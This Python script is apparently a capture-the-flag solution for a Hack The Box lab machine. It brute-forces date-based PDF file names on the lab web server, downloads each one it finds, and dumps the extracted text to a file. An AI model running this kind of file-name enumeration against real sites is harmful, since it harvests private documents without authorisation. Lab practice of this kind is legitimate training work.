#!/usr/bin/env python3

import requests
import PyPDF2
import os

url = "http://intelligence.htb/documents/"

tmp = []

with open("/home/kali/htb/intelligence/nums") as f:
    for l in f:
        month = l.strip("\n")
        for i in range(0,32):
            if i < 10:
                day = "0" + str(i)
            else:
                day = i
            prefix = f"2020-{month}-{day}-upload.pdf" 
            new_url = url + prefix 
            req = requests.get(new_url)
            if req.status_code != 404:
                print(f"We found something with {new_url}: %d" %len(req.text))
                os.system(f"wget {new_url}")   
                f = open(prefix, "rb")
                pdfObject = PyPDF2.PdfFileReader(f).getPage(0)
                content = pdfObject.extractText()
                tmp.append(prefix + "\n" + content)

with open("contents.txt", "w") as k:
    k.write("\n".join(tmp))
            
                
